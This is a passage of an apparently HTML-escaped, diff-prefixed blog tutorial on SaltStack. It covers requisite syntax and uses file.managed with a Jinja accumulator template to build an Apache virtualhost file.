-&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo STATEID1&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;           &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID2&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# second.sls&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID2&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd.run&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo last&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# third sls&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;     &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID3&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd.run&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;echo STATEID3&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;         &lt;span class=&quot;l-Scalar-Plain&quot;&gt;require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;           &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;STATEID2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;&lt;strong&gt;Be careful:&lt;/strong&gt; the syntax for a requisite is:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;&amp;lt;requisite&amp;gt;&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt;       &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;&amp;lt;module&amp;gt;&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;&amp;lt;state id&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;It is not:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;&amp;lt;requisite&amp;gt;&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt;       &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;&amp;lt;module&amp;gt;.&amp;lt;function&amp;gt;&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;&amp;lt;state id&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;So it is not &lt;code&gt;cmd.run:&lt;/code&gt; here but only &lt;code&gt;cmd:&lt;/code&gt;. And as soon as you start using requisites you see that using meaningfull states ids and not names shortcuts to declare states is quite important, for clarity at least.&lt;/p&gt;
-
-&lt;h2&gt;file.managed using file.accumulated&lt;/h2&gt;
-
-&lt;p&gt;All &lt;a href=&quot;https://github.com/regilero/regilero-blog-examples/tree/master/accumulated-blockreplace&quot;&gt;examples are available on github here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;In this first example we'll use several states, the last state will install a &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.managed&quot;&gt;managed file&lt;/a&gt; in &lt;code&gt;/etc/apache2/sites-available/100-foo.example.com&lt;/code&gt;, it's an apache virtualhost file, in the debian way. The jinja template associated with this file will contain the basic rules, but we want to allow some other states to add instructions on this virtualhost. We'll see theses states later. We start by the end, with this state building a virtualhost file in a &lt;code&gt;example_com_apache_virtualhost.sls&lt;/code&gt; file:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;apache-install&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;pkg.installed&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;pkgs&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;           &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;apache2&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt; &lt;span class=&quot;-Error&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;l-Scalar-Plain&quot;&gt;100_example_com_virtualhost&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;       &lt;span class=&quot;l-Scalar-Plain&quot;&gt;file.managed&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;salt://files/apache_vhost&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;/etc/apache2/sites-available/100-example.com&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;root&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;root&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;0664&amp;quot;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;jinja&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;defaults&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;             &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;docroot&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;/path/to/www&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;             &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;servername&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;example.com&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;         &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;             &lt;span class=&quot;p-Indicator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;pkg&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l-Scalar-Plain&quot;&gt;apache-install&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;This file should be put somewhere on your state tree, in this example I will make the function calls as if it were on the root of this tree (like the top.sls file). But there's also a &lt;em&gt;source&lt;/em&gt; template for the managed file, which is called &lt;code&gt;salt://files/apache_vhost&lt;/code&gt;, this file should be present under the salt master tree, in the directory &lt;code&gt;files&lt;/code&gt; (or alter the used path). This is this very simple basic virtualhost example template content:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Main Virtualhost for {{ servername }}&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;&amp;lt;VirtualHost&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;*:80&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;ServerAdmin&lt;/span&gt; foo@example.com
-&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;DocumentRoot&lt;/span&gt; {{ docroot }}
-&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;ServerName&lt;/span&gt; {{ servername }}
-&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;LogLevel&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;info&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;None&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;Order&lt;/span&gt; allow, deny
-&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;deny&lt;/span&gt; from &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;{{ docroot }}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;Options&lt;/span&gt; FollowSymLinks
-&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;None&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;Order&lt;/span&gt; allow,deny
-&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;Allow&lt;/span&gt; from &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt;     
-&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;&amp;lt;/VirtualHost&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Let's test this simple state:&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;salt-call -linfo state.sls example_com_apache_virtualhost&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;You should en up with two states in success and a &lt;code&gt;/etc/apache2/sites-available/100-example.com&lt;/code&gt; file created.
-Now let's say we want other states, an infinite list of other states, to be able to alter this file and add content either in the main Directory section or at the end of the file. This way other states could add some apache configuration (this is an example, another way of doing it could be apache's include directive).&lt;/p&gt;
-
-&lt;p&gt;Here comes the &lt;strong&gt;accumulator&lt;/strong&gt; jinja variable. It's a dictionnary, with several keys. Each key of this dictionary is the result of &lt;strong&gt;one or more&lt;/strong&gt; &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.accumulated&quot;&gt;&lt;code&gt;file.accumulated&lt;/code&gt;&lt;/a&gt; states. So you may have this variable (or not) and it may contain some keys with text data inside. Let's see how to use this on the jinja template (and at first, we known it's empty, we did not used any accumulated state yet).&lt;/p&gt;
-
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-jinja&quot; data-lang=&quot;jinja&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;# Main Virtualhost for &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;servername&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &amp;lt;VirtualHost *:80&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        ServerAdmin foo@example.com&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        DocumentRoot &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;docroot&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        ServerName &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;servername&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        LogLevel info&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;      &amp;lt;Directory /&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        AllowOverride None&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        Order allow, deny&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        deny from all&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;      &amp;lt;/Directory&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;      &amp;lt;Directory &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;docroot&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        Options FollowSymLinks&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        AllowOverride None&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        Order allow,deny&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        Allow from all&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt; 
-&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        # Here any extra configuration settings if any:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost-maindir&amp;#39;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost-maindir&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt; 
-&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;      &amp;lt;/Directory&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt; 
-&lt;span class=&quot;lineno&quot;&gt;34&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    # Here any extra configuration settings if any:&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;35&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;36&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost&amp;#39;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;37&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
-&lt;span class=&quot;lineno&quot;&gt;38&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
